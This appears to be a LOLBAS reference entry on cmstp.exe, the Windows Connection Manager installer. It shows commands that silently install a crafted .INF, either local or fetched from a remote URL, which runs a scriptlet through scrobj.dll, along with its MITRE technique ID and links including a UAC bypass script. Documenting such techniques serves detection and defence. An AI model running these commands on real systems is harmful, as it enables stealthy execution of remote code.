## Cmstp.exe
```

cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: [T1191](https://attack.mitre.org/wiki/Technique/T1191)   
   
* Links:   
  * https://twitter.com/NickTyrer/status/958450014111633408
  * https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
  * https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
  * https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
  * https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
  * https://github.com/hfiref0x/UACME
   
* File path:   
  * C:\Windows\system32\cmstp.exe
  * C:\Windows\sysWOW64\cmstp.exe
   
* Acknowledgement:   
  * Name: Oddvar Moe
    * Twitter: [@oddvarmoe](https://twitter.com/@oddvarmoe)
    * Blog: https://oddvar.moe
  * Name: Nick Tyrer
    * Twitter: [@NickTyrer](https://twitter.com/@NickTyrer)
    * Blog: 
   
OS:  
